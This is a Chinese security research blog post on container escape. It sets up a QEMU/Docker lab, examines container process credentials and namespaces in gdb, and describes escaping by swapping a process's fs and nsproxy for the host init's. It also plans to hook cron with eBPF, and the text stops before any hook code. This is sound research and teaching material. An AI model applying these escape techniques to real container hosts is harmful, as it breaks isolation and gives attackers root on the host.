> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-271107.htm)

> [原创] 内核，容器，与 eBPF 攻防初探

[](#内核，容器，与ebpf攻防初探)内核，容器，与 eBPF 攻防初探
=====================================

目录

*   [内核，容器，与 eBPF 攻防初探](#内核，容器，与ebpf攻防初探)
*   [环境搭建](#环境搭建)
*   [从内核的角度看一个容器内进程](#从内核的角度看一个容器内进程)
*            [从内核漏洞到容器逃逸](#从内核漏洞到容器逃逸)
*            [从内核特性到容器逃逸](#从内核特性到容器逃逸)
*                            [libbpf](#libbpf)
*                            [libbpf-bootstrap](#libbpf-bootstrap)
*                            [eBPF 用户态程序基本结构](#ebpf用户态程序基本结构)
*                            通过 evil eBPF 劫持高权限进程完成逃逸
*                                    [cron 基本介绍与流程](#cron基本介绍与流程)
*                                    [Hook 程序分析](#hook程序分析)
*                                    [在 Docker 中测试](#在docker中测试)
*                            [通过 eBPF 劫持 sshd 进程](#通过ebpf劫持sshd进程)

 

最近在看一些容器的内容，在看之前我先手动实现了一个 mini-docker，网上有很多不错的资料，推荐大家也去写一个玩玩。如果想快速了解容器，也可以看我的笔记：https://github.com/OrangeGzY/mini-docker

环境搭建
====

最终要产生这样一个环境：

 

![](https://bbs.pediy.com/upload/attach/202201/876323_U3VYAEP84C4XKWS.png)

 

目前看到网上的貌似都是双机调试，但是双机还是比较麻烦，于是最好就是用 QEMU 来做。

1.  首先编译对应的内核，得到 vmlinux，bzImage
    
    注意，在编译内核时一定要打开： `CONFIG_OVERLAY_FS=y` 因为 docker 需要对应的文件系统的支持。
    
    打开 `CONFIG_GDB_SCRIPTS=y` , `CONFIG_DEBUG_INFO=y` 如果后续要调试内核的话。
    
2.  然后利用 syzkaller 的 create-image.sh。
    
    修改添加对 cgroup 的挂载：
    
    ```
    echo 'debugfs /sys/kernel/debug debugfs defaults 0 0' | sudo tee -a $DIR/etc/fstab
    echo 'securityfs /sys/kernel/security securityfs defaults 0 0' | sudo tee -a $DIR/etc/fstab
    echo 'configfs /sys/kernel/config/ configfs defaults 0 0' | sudo tee -a $DIR/etc/fstab
    echo 'binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc defaults 0 0' | sudo tee -a $DIR/etc/fstab
    echo 'tmpfs /sys/fs/cgroup cgroup defaults 0 0' | sudo tee -a $DIR/etc/fstab
    
    ```
    
    执行：`./create-image.sh` 生成文件系统。
    
3.  qemu 启动脚本：
    
    ```
    qemu-system-x86_64 \
    -drive file=./stretch.img,format=raw \
    -m 256 \
    -net nic \
    -net user,host=10.0.2.10,hostfwd=tcp::23505-:22 \
    -enable-kvm \
    -kernel ./bzImage \
    -append "console=ttyS0 root=/dev/sda earlyprintk=serial" \
    -nographic \
    -pidfile vm.pid \
    
    ```
    
4.  启动起来之后的连接命令：
    
    ```
    ssh-keygen -f "/root/.ssh/known_hosts" -R "[localhost]:23505"
    ssh -i ./stretch.id_rsa -p 23505 root@localhost
    
    ```
    
5.  最终可以通过 ssh 进入系统
    
    ```
    root@syzkaller:~#
    
    ```
    
6.  修改登陆密码：
    
    ```
    apt install docker-ce
     
    vim /etc/ssh/sshd_config
     
    PermitRootLogin yes
     
    passwd root
     
    poweroff
    
    ```
    
    如果第一步失败就按照：
    
    https://docs.docker.com/engine/install/debian/
    
    https://stackoverflow.com/questions/48002345/docker-ce-depends-libseccomp2-2-3-0-but-2-2-3-3ubuntu3-is-to-be-installe
    
7.  重新登陆确认：
    
    ```
    Debian GNU/Linux 9 syzkaller ttyS0
     
    syzkaller login: root
    Password:
    Unable to get valid context for root
    Last login: Fri Dec  3 14:09:17 UTC 2021 from 10.0.2.10 on pts/0
    Linux syzkaller 5.16.0-rc1 #3 SMP PREEMPT Wed Dec 1 09:46:37 PST 2021 x86_64
     
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
     
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    root@syzkaller:~#
    
    ```
    
8.  安装对应的 docker-ce，方法：
    
    https://docs.docker.com/engine/install/debian/
    
9.  这里有一个官方提供的用于检查对应的 docker 运行时环境的
    
    https://github.com/moby/moby/blob/master/contrib/check-config.sh
    
    使用方式：
    
    ```
    ./check-config.sh /path/to/kernel/.config
    
    ```
    
    如果启动不起来什么的，就运行一下这个脚本 check 一下环境
    
    然后开启对应的需要的 CONFIG，重新编译即可。
    
    **如果以上步骤之后，还是无法直接运行 dockerd，那么请按照下面的步骤由 runc 来直接手动创建容器**
    
10.  ```
    # 1. Get rootfs(out of VM)
    docker export $(docker create busybox) -o busybox.tar
     
    # 2. put rootfs into VM's .img
    root@ubuntu:~/container# mount -o loop ./stretch.img /mnt/chroot/
    root@ubuntu:~/container# cp ./busybox.tar /mnt/chroot/root/
    root@ubuntu:~/container# umount /mnt/chroot/
     
    # 3. Finally, boot the QEMU, and untar the busybox.tar in ~ to rootfs/
    root@syzkaller:~# cd rootfs/
    root@syzkaller:~/rootfs# pwd
    /root/rootfs
    root@syzkaller:~/rootfs# ls
    bin  dev  etc  home  proc  root  sys  tmp  usr  var
     
    # 4. Generate OCI config
    docker-runc spec
    root@syzkaller:~# ls
    config.json  rootfs
     
    # 5. Run manually,
    docker-runc run root@syzkaller:~# docker-runc run guoziyi
    / # ls
    bin   dev   etc   home  proc  root  sys   tmp   usr   var
    / # id
    uid=0(root) gid=0(root)
    / # ps -ef
    PID   USER     TIME  COMMAND
        1 root      0:00 sh
        7 root      0:00 ps -ef
    / # exit
     
    # 6.
    vim config.json
    "root": {
        "path":"root",
        "readonly":"false"
    } 
    ```
    

最终效果：

 

首先我们在 runc 启动的容器中起一个 top 进程：

```
Mem: 261032K used, 1438232K free, 16624K shrd, 6996K buff, 101932K cached
CPU:  0.0% usr  0.3% sys  0.0% nic 99.4% idle  0.0% io  0.0% irq  0.0% sirq
Load average: 0.00 0.00 0.00 2/77 6
  PID  PPID USER     STAT   VSZ %VSZ CPU %CPU COMMAND
    6     1 root     R     1328  0.0   0  0.2 top
    1     0 root     S     1336  0.0   0  0.0 sh

```

可以看到，此时容器内部有两个进程，一个是 1 号进程 sh，一个是 6 号进程 top。

 

然后我们在容器外运行一下 `pstree`

```
root@syzkaller:~# pstree -pl
systemd(1)-+-agetty(244)
           |-agetty(245)
           |-cron(193)
           |-dbus-daemon(189)---{dbus-daemon}(191)
           |-dhclient(225)
           |-rsyslogd(194)-+-{in:imklog}(196)
           |               |-{in:imuxsock}(195)
           |               `-{rs:main Q:Reg}(197)
           |-sshd(247)-+-sshd(319)---bash(328)---docker-runc(497)-+-sh(507)---top(526)

```

可以看到，容器内的 1 号进程实际上就是容器外的 507 号进程映射进来的。他是 docker-runc 的子进程。同样的，容器内的 top 进程也是 507 的子进程。

从内核的角度看一个容器内进程
==============

在本部分我们通过从 host 机上使用 gdb(gef) 来 target remote 到 qemu 的内核，然后去观察对应的 container 的 process。

 

这里推荐使用 gef 插件，感觉比 pwndbg 快得多。

 

我个人对于内核的配置如下（1 year expire）：

 

https://paste.ubuntu.com/p/wMvftKv2bV/

 

首先需要明确的一点是，容器内进程的本质接近于一个宿主机上命名空间、资源、文件系统隔离的受限进程。

 

我们关注 task_struct 中的一些结构：

```
/* task_struct member predeclarations (sorted alphabetically): */
 
struct fs_struct;
struct nsproxy;
 
struct task_struct {
 
 
    #ifdef CONFIG_CGROUPS
    /* Control Group info protected by css_set_lock: */
    struct css_set __rcu        *cgroups;
    /* cg_list protected by css_set_lock and tsk->alloc_lock: */
    struct list_head        cg_list;
 
 
    ......
    /* Namespaces: */
    struct nsproxy            *nsproxy;
    ......
    /* Filesystem information: */
    struct fs_struct        *fs;
    ......
}

```

可以看到，作为一个进程，在内核的 PCB 中维护了对应的结构，其中两个非常重要的一个是涉及工作目录 or 路径的 fs，一个是涉及 namespace 的 nsproxy，最后是涉及资源限制的 css_set

 

我们可以观察下这些个结构体。

 

**struct nsproxy**

```
/*
 * A structure to contain pointers to all per-process
 * namespaces - fs (mount), uts, network, sysvipc, etc.
 *
 * The pid namespace is an exception -- it's accessed using
 * task_active_pid_ns.  The pid namespace here is the
 * namespace that children will use.
 *
 * 'count' is the number of tasks holding a reference.
 * The count for each namespace, then, will be the number
 * of nsproxies pointing to it, not the number of tasks.
 *
 * The nsproxy is shared by tasks which share all namespaces.
 * As soon as a single namespace is cloned or unshared, the
 * nsproxy is copied.
 */
struct nsproxy {
    atomic_t count;        //refcount
    struct uts_namespace *uts_ns;
    struct ipc_namespace *ipc_ns;
    struct mnt_namespace *mnt_ns;
    struct pid_namespace *pid_ns_for_children;    // pid namespace 比较特殊，我记得是设置完之后fork一下才能生效的，他会将fork之后的子进程作为new namespace的一号进程
    struct net          *net_ns;
    struct time_namespace *time_ns;
    struct time_namespace *time_ns_for_children;
    struct cgroup_namespace *cgroup_ns;
};

```

**struct fs_struct**

```
struct fs_struct {
    int users;
    spinlock_t lock;
    seqcount_spinlock_t seq;
    int umask;
    int in_exec;
    struct path root, pwd;
} __randomize_layout;
 
struct path {
    struct vfsmount *mnt;
    struct dentry *dentry;
} __randomize_layout;
 
 
 
struct dentry {
    /* RCU lookup touched fields */
    unsigned int d_flags;        /* protected by d_lock */
    seqcount_spinlock_t d_seq;    /* per dentry seqlock */
    struct hlist_bl_node d_hash;    /* lookup hash list */
    struct dentry *d_parent;    /* parent directory */
    struct qstr d_name;
    struct inode *d_inode;        /* Where the name belongs to - NULL is
                     * negative */
    unsigned char d_iname[DNAME_INLINE_LEN];    /* small names */
 
    /* Ref lookup also touches following */
    struct lockref d_lockref;    /* per-dentry lock and refcount */
    const struct dentry_operations *d_op;
    struct super_block *d_sb;    /* The root of the dentry tree */
    unsigned long d_time;        /* used by d_revalidate */
    void *d_fsdata;            /* fs-specific data */
 
    union {
        struct list_head d_lru;        /* LRU list */
        wait_queue_head_t *d_wait;    /* in-lookup ones only */
    };
    struct list_head d_child;    /* child of parent list */
    struct list_head d_subdirs;    /* our children */
    /*
     * d_alias and d_rcu can share memory
     */
    union {
        struct hlist_node d_alias;    /* inode alias list */
        struct hlist_bl_node d_in_lookup_hash;    /* only for in-lookup ones */
         struct rcu_head d_rcu;
    } d_u;
} __randomize_layout;
....

```

```
struct fs_struct
    -> struct path root
        -> struct dentry *dentry -> struct qstr d_name;

```

可以看到容器内的一号进程的工作目录：

```
gef➤  p ((struct task_struct *)0xffff88800c1b8000)->fs->root->dentry->d_name
$12 = {
  {
    {
      hash = 0x2a81534f,
      len = 0x6
    },
    hash_len = 0x62a81534f
  },
  name = 0xffff8880100a7b38 "rootfs"
}
gef➤

```

**fs:**

```
# container init
gef➤  p *$t->fs
$11 = {
 ......
  umask = 0x12,
  in_exec = 0x0,
  root = {
    mnt = 0xffff888010b86320,
    dentry = 0xffff8880120b5700
  },
  pwd = {
    mnt = 0xffff888010b86320,
    dentry = 0xffff88801235d900
  }
}
 
# host init
gef➤  p *$init->fs
$12 = {
......
  umask = 0x0,
  in_exec = 0x0,
  root = {
    mnt = 0xffff8880076b8da0,
    dentry = 0xffff888008119200
  },
  pwd = {
    mnt = 0xffff8880076b8da0,
    dentry = 0xffff888008119200
  }
}

```

**namespace:**

```
gef➤  p *(struct nsproxy*)$t->nsproxy
$3 = {
  count = {
    counter = 0x1
  },
  uts_ns = 0xffff88800c6e91f0,
  ipc_ns = 0xffff88801000e800,
  mnt_ns = 0xffff88800694e800,
  pid_ns_for_children = 0xffff88800cedd0c8,
  net_ns = 0xffff88800ec78d40,
  time_ns = 0xffffffff853ec0e0 ,
  time_ns_for_children = 0xffffffff853ec0e0 ,
  cgroup_ns = 0xffffffff853f4680 }
 
# init process
gef➤  p *(struct nsproxy *)0xffffffff852cd8a0
$4 = {
  count = {
    counter = 0x4c
  },
  uts_ns = 0xffffffff8521a720 ,
  ipc_ns = 0xffffffff855a62a0 ,
  mnt_ns = 0xffff88800694e000,
  pid_ns_for_children = 0xffffffff852cbf20 ,
  net_ns = 0xffffffff858945c0 ,
  time_ns = 0xffffffff853ec0e0 ,
  time_ns_for_children = 0xffffffff853ec0e0 ,
  cgroup_ns = 0xffffffff853f4680 } 
```

可以看到，从命名空间的角度上来说，容器内一号进程的 ns 和虚拟机自身的一号进程的 ns 是不一样的。uts、ipc、mnt、pid 等都是新的。

 

**cred：**

 

容器进程

```
gef➤  p *$t->cred
$8 = {
  usage = {
    counter = 0x3
  },
  uid = {
    val = 0x0
  },
  gid = {
    val = 0x0
  },
  suid = {
    val = 0x0
  },
  sgid = {
    val = 0x0
  },
  euid = {
    val = 0x0
  },
  egid = {
    val = 0x0
  },
  fsuid = {
    val = 0x0
  },
  fsgid = {
    val = 0x0
  },
  securebits = 0x0,
  cap_inheritable = {
    cap = {0x20000420, 0x0}
  },
  cap_permitted = {
    cap = {0x20000420, 0x0}
  },
  cap_effective = {
    cap = {0x20000420, 0x0}
  },
  cap_bset = {
    cap = {0x20000420, 0x0}
  },
  cap_ambient = {
    cap = {0x0, 0x0}
  },

```

host 进程：

```
gef➤  p *$init->cred
$10 = {
  usage = {
    counter = 0xb
  },
  uid = {
    val = 0x0
  },
  gid = {
    val = 0x0
  },
  suid = {
    val = 0x0
  },
  sgid = {
    val = 0x0
  },
  euid = {
    val = 0x0
  },
  egid = {
    val = 0x0
  },
  fsuid = {
    val = 0x0
  },
  fsgid = {
    val = 0x0
  },
  securebits = 0x0,
  cap_inheritable = {
    cap = {0x0, 0x0}
  },
  cap_permitted = {
    cap = {0xffffffff, 0x1ff}
  },
  cap_effective = {
    cap = {0xffffffff, 0x1ff}
  },
  cap_bset = {
    cap = {0xffffffff, 0x1ff}
  },
  cap_ambient = {
    cap = {0x0, 0x0}
  },

```

可以看到虽然 id 都是 0，但是他们的 Cap 是不一样的，host 的 init 进程有完全的 CAP，但是容器的 init 进程只有很少的 Capability。

```
root@ubuntu:~/container/module_for_container# capsh --decode=0x20000420
WARNING: libcap needs an update (cap=40 should have a name).
0x0000000020000420=cap_kill,cap_net_bind_service,cap_audit_write
 
 
root@ubuntu:~/container/module_for_container# capsh --decode=0xffffffff
WARNING: libcap needs an update (cap=40 should have a name).
0x00000000ffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap

```

从内核漏洞到容器逃逸
----------

从内核打到容器逃逸其实原理也很简单，就是把当前 docker 里的 sh 进程的 nsproxy 和 fs 都切换成宿主机进程的（最好是宿主机 init 进程）。想达到这个效果要满足以下的条件：

1.  能通过遍历拿到宿主机某一个进程（最好是 init 进程）的 task_struct。
2.  能 **读写** 对应的 task_struct 的数据，修改当前进程的 fs 和 nsproxy（比如直接把对应的指针改成指向 init 进程的，或者调用`switch_task_namespaces` 切换 ns）

在实际测试中，当我们把进程的 task_struct 的 fs 改成对应的 `init_fs` 。就已经能实现一个基本的逃逸了。  
有了这个基础后，其实很容易想到，其实我们可以让容器进程逃逸到任意别的进程的 ns 和 fs 中，只要把对应的信息切换过去就行。

 

更进一步的，我们可以尝试寻找如何对于 `init_fs` 进行堆喷。

从内核特性到容器逃逸
----------

这一部分与上一部分区别很大的是，我们并不是直接通过内核漏洞来完成容器逃逸的整个过程，而是通过一些 Linux Feature 来恶意的完成容器的逃逸。

 

由于 eBPF 本身是内核态的模块，可以用于几乎无差别的 Hook，那么一个朴素的想法就是，通过 eBPF 去 hook 一些跑在用户态的并且可以执行命令的服务（用户态进程），然后来进行一个容器外的命令执行。又或者通过 eBPF 来对直接的读内核态的敏感数据造成泄露，辅助逃逸或者信息的泄露。

#### libbpf

https://github.com/libbpf/libbpf

 

libbpf 这个项目本身类似于

 

首先我们需要对应的 btf 支持：

> If your kernel doesn't come with BTF built-in, you'll need to build custom kernel. You'll need:
> 
> *   `pahole` 1.16+ tool (part of `dwarves` package), which performs DWARF to BTF conversion;
> *   kernel built with `CONFIG_DEBUG_INFO_BTF=y` option;

 

check 一下：

```
root@syzkaller:~# ls -la /sys/kernel/btf/vmlinux
-r--r--r--. 1 root root 5883079 Dec  7 07:05 /sys/kernel/btf/vmlinux

```

#### libbpf-bootstrap

https://github.com/libbpf/libbpf-bootstrap

```
git clone https://github.com/libbpf/libbpf-bootstrap.git
 
cd libbpf-bootstrap
 
cd libbpf/src && make
 
cd ../../examples/c

```

接下来创建对应的 hello 文件：

```
/* cat hello.bpf.c */
#include #include SEC("tracepoint/syscalls/sys_enter_execve")
int handle_tp(void *ctx)
{
    int pid = bpf_get_current_pid_tgid()>> 32;
    char fmt[] = "BPF triggered from PID %d.\n";
    bpf_trace_printk(fmt, sizeof(fmt), pid);
    return 0;
}
 
char LICENSE[] SEC("license") = "Dual BSD/GPL"; 
```

```
/* cat hello.c */
#include #include #include #include #include #include #include #include #include #include "hello.skel.h"
 
#define DEBUGFS "/sys/kernel/debug/tracing/"
 
/* logging function used for debugging */
static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
#ifdef DEBUGBPF
    return vfprintf(stderr, format, args);
#else
    return 0;
#endif
}
 
/* read trace logs from debug fs */
void read_trace_pipe(void)
{
    int trace_fd;
 
    trace_fd = open(DEBUGFS "trace_pipe", O_RDONLY, 0);
    if (trace_fd < 0)
        return;
 
    while (1) {
        static char buf[4096];
        ssize_t sz;
 
        sz = read(trace_fd, buf, sizeof(buf) - 1);
        if (sz> 0) {
            buf[sz] = 0;
            puts(buf);
        }
    }
}
 
/* set rlimit (required for every app) */
static void bump_memlock_rlimit(void)
{
    struct rlimit rlim_new = {
        .rlim_cur    = RLIM_INFINITY,
        .rlim_max    = RLIM_INFINITY,
    };
 
    if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) {
        fprintf(stderr, "Failed to increase RLIMIT_MEMLOCK limit!\n");
        exit(1);
    }
}
 
int main(int argc, char **argv)
{
    struct hello_bpf *skel;
    int err;
 
    /* Set up libbpf errors and debug info callback */
    libbpf_set_print(libbpf_print_fn);
 
    /* Bump RLIMIT_MEMLOCK to allow BPF sub-system to do anything */
    bump_memlock_rlimit();
 
    /* Open BPF application */
    skel = hello_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF skeleton\n");
        return 1;
    }
 
    /* Load & verify BPF programs */
    err = hello_bpf__load(skel);
    if (err) {
        fprintf(stderr, "Failed to load and verify BPF skeleton\n");
        goto cleanup;
    }
 
    /* Attach tracepoint handler */
    err = hello_bpf__attach(skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF skeleton\n");
        goto cleanup;
    }
 
    printf("Hello BPF started, hit Ctrl+C to stop!\n");
 
    read_trace_pipe();
 
cleanup:
    hello_bpf__destroy(skel);
    return -err;
} 
```

更新当前目录下对应的 Makefile 中的：

```
APPS = minimal bootstrap uprobe kprobe fentry hello

```

最后运行 `make`

 

然后运行 `./hello`

 

输出：

```
root@ubuntu:~/libbpf-bootstrap/examples/c# ./hello
Hello BPF started, hit Ctrl+C to stop!
            node-6172    [001] d...  1730.240057: bpf_trace_printk: BPF triggered from PID 6172.
 
 
              sh-6174    [000] d...  1730.245028: bpf_trace_printk: BPF triggered from PID 6174.
 
 
              sh-6173    [003] d...  1730.247639: bpf_trace_printk: BPF triggered from PID 6173.
 
 
            node-6175    [003] d...  1734.181666: bpf_trace_printk: BPF triggered from PID 6175.
 
 
              sh-6177    [002] d...  1734.184994: bpf_trace_printk: BPF triggered from PID 6177.
 
 
              sh-6176    [001] d...  1734.187739: bpf_trace_printk: BPF triggered from PID 6176.

```

说明成功。

#### eBPF 用户态程序基本结构

https://facebookmicrosites.github.io/bpf/blog/2020/02/20/bcc-to-libbpf-howto-guide.html

```
/* cat hello.bpf.c */
#include #include SEC("tracepoint/syscalls/sys_enter_execve")
int handle_tp(void *ctx)
{
    int pid = bpf_get_current_pid_tgid()>> 32;
    char fmt[] = "BPF triggered from PID %d.\n";
    bpf_trace_printk(fmt, sizeof(fmt), pid);
    return 0;
}
 
char LICENSE[] SEC("license") = "Dual BSD/GPL"; 
```

首先，`bpf.h` 中主要定义了一堆 define 和 struct。

 

`bpf_helpers.h` 中主要是一些 helper macros 和 functions。

```
/*
 * Helper macro to place programs, maps, license in
 * different sections in elf_bpf file. Section names
 * are interpreted by libbpf depending on the context (BPF programs, BPF maps,
 * extern variables, etc).
 * To allow use of SEC() with externs (e.g., for extern .maps declarations),
 * make sure __attribute__((unused)) doesn't trigger compilation warning.
 */
#define SEC(name) \
    _Pragma("GCC diagnostic push")                        \
    _Pragma("GCC diagnostic ignored \"-Wignored-attributes\"")        \
    __attribute__((section(name), used))                    \
    _Pragma("GCC diagnostic pop")

```

SEC 是用来指定对应的类型，libbpf 会根据上下文来解释然后放置到 elf_bpf 的不同的 sections 上。

 

在 hello.c 中主要是三个函数：

```
#define DEBUGFS "/sys/kernel/debug/tracing/"
 
/* logging function used for debugging */
static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
#ifdef DEBUGBPF
    return vfprintf(stderr, format, args);
#else
    return 0;
#endif
}

```

这里通过 `libbpf_set_print(libbpf_print_fn);` 指定了 bpf debug 的输出标准。利用 vfprintf 从 stderr 输出。

 

接下来设置对应的 rlimit by：

```
/* Bump RLIMIT_MEMLOCK to allow BPF sub-system to do anything */
bump_memlock_rlimit();

```

```
/* set rlimit (required for every app) */
static void bump_memlock_rlimit(void)
{
    struct rlimit rlim_new = {
        .rlim_cur    = RLIM_INFINITY,
        .rlim_max    = RLIM_INFINITY,
    };
 
    if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) {
        fprintf(stderr, "Failed to increase RLIMIT_MEMLOCK limit!\n");
        exit(1);
    }
}

```

可以看到这里将值设置成最大。

 

最后有个 `read_trace_pipe();` 读出 log 信息：

```
/* read trace logs from debug fs */
void read_trace_pipe(void)
{
    int trace_fd;
 
    trace_fd = open(DEBUGFS "trace_pipe", O_RDONLY, 0);
    if (trace_fd < 0)
        return;
 
    while (1) {
        static char buf[4096];
        ssize_t sz;
 
        sz = read(trace_fd, buf, sizeof(buf) - 1);
        if (sz> 0) {
            buf[sz] = 0;
            puts(buf);
        }
    }
}

```

此外，还有一些别的函数。

 

我们注意到在 hello.c 中有个：

```
#include "hello.skel.h"

```

这个文件应该是在编译过程中 `Generate BPF skeletons` 产生的。

```
/* Open BPF application */
skel = hello_bpf__open();
if (!skel) {
    fprintf(stderr, "Failed to open BPF skeleton\n");
    return 1;
}
 
/* Load & verify BPF programs */
err = hello_bpf__load(skel);
if (err) {
    fprintf(stderr, "Failed to load and verify BPF skeleton\n");
    goto cleanup;
}
 
/* Attach tracepoint handler */
err = hello_bpf__attach(skel);
if (err) {
    fprintf(stderr, "Failed to attach BPF skeleton\n");
    goto cleanup;
}

```

```
root@ubuntu:~/libbpf-bootstrap/examples/c# cd .output/ && ls
bootstrap.bpf.o  bootstrap.skel.h  fentry.bpf.o  fentry.skel.h  hello.o       kprobe.bpf.o  kprobe.skel.h  libbpf.a       minimal.o       pkgconfig     uprobe.o
bootstrap.o      bpf               fentry.o      hello.bpf.o    hello.skel.h  kprobe.o      libbpf         minimal.bpf.o  minimal.skel.h  uprobe.bpf.o  uprobe.skel.h

```

在 .output 目录之下。

#### 通过 evil eBPF 劫持高权限进程完成逃逸

11 月份的时候，腾讯蓝军的同学发了一篇很有意思的文章：https://security.tencent.com/index.php/blog/msg/206

 

这篇文章的后续还是有很多可以研究的点。首先我们完整的完成这个 evil eBPF 程序。

 

我的实现代码：https://github.com/OrangeGzY/Eebpf-kit/blob/main/libbpf-bootstrap/examples/c/hello.bpf.c

##### cron 基本介绍与流程

```
man cron
 
NAME
       cron - daemon to execute scheduled commands (Vixie Cron)

```

在 ubuntu 上我们使用的是 Vixie Cron

 

https://www.runoob.com/w3cnote/linux-crontab-tasks.html

```
root         800       1  0 02:17 ?        00:00:00 /usr/sbin/cron -f

```

https://github.com/vixie/cron/tree/master

 

在源码中其实我们主要关注 https://github.com/vixie/cron/blob/master/database.c 的 `load_database` 函数。

```
#define CRONDIR        "/var/spool/cron"
#define SPOOL_DIR    "crontabs"
#define SYSCRONTAB "/etc/crontab"
 
 
#define TMAX(a,b) (is_greater_than(a,b)?(a):(b))
#define TEQUAL(a,b) (a.tv_sec == b.tv_sec && a.tv_nsec == b.tv_nsec)
 
 
/* before we start loading any data, do a stat on SPOOL_DIR
     * so that if anything changes as of this moment (i.e., before we've
     * cached any of the database), we'll see the changes next time.
     */
if (stat(SPOOL_DIR, &statbuf) < OK) {
        log_it("CRON", getpid(), "STAT FAILED", SPOOL_DIR);
        (void) exit(ERROR_EXIT);
    }
/* track system crontab file
     */
if (stat(SYSCRONTAB, &syscron_stat) < OK)
        syscron_stat.st_mtim = ts_zero;
 
/* if spooldir's mtime has not changed, we don't need to fiddle with
 * the database.
 *
 * Note that old_db->mtime is initialized to 0 in main(), and
 * so is guaranteed to be different than the stat() mtime the first
 * time this function is called.
 */
if (TEQUAL(old_db->mtim, TMAX(statbuf.st_mtim, syscron_stat.st_mtim))) {
    Debug(DLOAD, ("[%ld] spool dir mtime unch, no load needed.\n",
              (long)getpid()))
    return;
}
/* something's different.  make a new database, moving unchanged
 * elements from the old database, reloading elements that have
 * actually changed.  Whatever is left in the old database when
 * we're done is chaff -- crontabs that disappeared.
 */
new_db.mtim = TMAX(statbuf.st_mtim, syscron_stat.st_mtim);
new_db.head = new_db.tail = NULL;
 
if (!TEQUAL(syscron_stat.st_mtim, ts_zero))
    process_crontab("root", NULL, SYSCRONTAB, &syscron_stat,&new_db, old_db);

```

可以看到是过了四个 check 然后直接调用：`process_crontab` 。

 

首先前两个判断，用 stat 获取对应的 `SPOOL_DIR` 和 `SYSCRONTAB` 文件的**最后一次修改时间**，放入对应的 stat 中。

```
struct stat
{
    dev_t     st_dev;     /* ID of device containing file */文件使用的设备号
    ino_t     st_ino;     /* inode number */    索引节点号
    mode_t    st_mode;    /* protection */  文件对应的模式，文件，目录等
    nlink_t   st_nlink;   /* number of hard links */    文件的硬连接数 
    uid_t     st_uid;     /* user ID of owner */    所有者用户识别号
    gid_t     st_gid;     /* group ID of owner */   组识别号 
    dev_t     st_rdev;    /* device ID (if special file) */ 设备文件的设备号
    off_t     st_size;    /* total size, in bytes */ 以字节为单位的文件容量  
    blksize_t st_blksize; /* blocksize for file system I/O */ 包含该文件的磁盘块的大小  
    blkcnt_t  st_blocks;  /* number of 512B blocks allocated */ 该文件所占的磁盘块 
    time_t    st_atime;   /* time of last access */ 最后一次访问该文件的时间  
    time_t    st_mtime;   /* time of last modification */ /最后一次修改该文件的时间  
    time_t    st_ctime;   /* time of last status change */ 最后一次改变该文件状态的时间  
};

```

第三个判断 old_db 的 mtim 与 `TMAX(statbuf.st_mtim, syscron_stat.st_mtim)` 比是否发生了变化，其实就是是否更新。`TMAX(statbuf.st_mtim, syscron_stat.st_mtim)` 这里是取了两个文件最大（最新）的更新时间。最后通过 new_db 记录最新时间。

 

最后只要保证 syscron 的最新修改时间不是 ts_zero，即可进入：`process_crontab("root", NULL, SYSCRONTAB, &syscron_stat,&new_db, old_db);`

```
const struct timespec ts_zero = {.tv_sec = 0L, .tv_nsec = 0L}

```

在 `process_crontab` 中

```
// tabname = "/etc/crontab"
if ((crontab_fd = open(tabname, O_RDONLY|O_NONBLOCK|O_NOFOLLOW, 0)) < OK) {
    /* crontab not accessible?
     */
    log_it(fname, getpid(), "CAN'T OPEN", tabname);
    goto next_crontab;
}
if (fstat(crontab_fd, statbuf) < OK) {
    log_it(fname, getpid(), "FSTAT FAILED", tabname);
    goto next_crontab;
}
 
/* if crontab has not changed since we last read it
 * in, then we can just use our existing entry.
 */
if (TEQUAL(u->mtim, statbuf->st_mtim)) {
    Debug(DLOAD, (" [no change, using old data]"))
    unlink_user(old_db, u);
    link_user(new_db, u);
    goto next_crontab;
}

```

可以看到首先用 fstat 判断了一下，然后判断 crontab 是否更新。最终 load_user

 

可以看一下 user 对应的结构体：

```
typedef    struct _user {
    struct _user    *next, *prev;    /* links */
    char        *name;
    struct timespec mtim;       /* last modtime of crontab */
    entry        *crontab;    /* this person's crontab */
} user;
 
typedef    struct _entry {
    struct _entry    *next;
    struct passwd    *pwd;
    char        **envp;
    char        *cmd;
    bitstr_t    bit_decl(minute, MINUTE_COUNT);
    bitstr_t    bit_decl(hour,   HOUR_COUNT);
    bitstr_t    bit_decl(dom,    DOM_COUNT);
    bitstr_t    bit_decl(month,  MONTH_COUNT);
    bitstr_t    bit_decl(dow,    DOW_COUNT);
    int        flags;
#define    MIN_STAR    0x01
#define    HR_STAR        0x02
#define    DOM_STAR    0x04
#define    DOW_STAR    0x08
#define    WHEN_REBOOT    0x10
#define    DONT_LOG    0x20
} entry;

```

可以看到里面维护了对应的 user 的 crontab 的 cmd。

 

最终我们的 job 会被加入队列中，由 `job_runqueue()` 调用 `do_command(j->e, j->u)` 运行。

```
typedef    struct _job {
    struct _job    *next;
    entry        *e;
    user        *u;
} job;
 
int
job_runqueue(void) {
    job *j, *jn;
    int run = 0;
 
    for (j = jhead; j; j = jn) {
        do_command(j->e, j->u);        // run
        jn = j->next;
        free(j);
        run++;
    }
    jhead = jtail = NULL;
    return (run);
}

```

##### Hook 程序分析

